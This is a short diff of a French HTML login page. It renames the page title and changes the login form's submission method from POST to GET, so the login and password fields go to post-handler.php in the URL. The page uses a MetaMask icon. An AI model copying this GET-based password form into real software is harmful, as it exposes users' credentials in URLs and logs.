@@ -5,12 +5,13 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <link rel="icon" type="image/png" href="metamask.png" />
     <link rel="stylesheet" type="text/css" href="style.css">
-    <title>Poudre aux lotteries</title>
+    <title>AuthentiForton</title>
   </head>
+
   <body>
     <h1>Bonjour</h1>
     <div class="container">
-      <form class="login" method="POST" action="post-handler.php" onsubmit="return submitForm(this);">
+      <form class="login" method="GET" action="post-handler.php" onsubmit="return submitForm(this);">
         <input name="login" id="login" type="text" placeholder="Login" />
         <input name="password" id="password" type="password" placeholder="Password" />
         <input name="submit" id="submit" type="submit" value="Envoyer" />
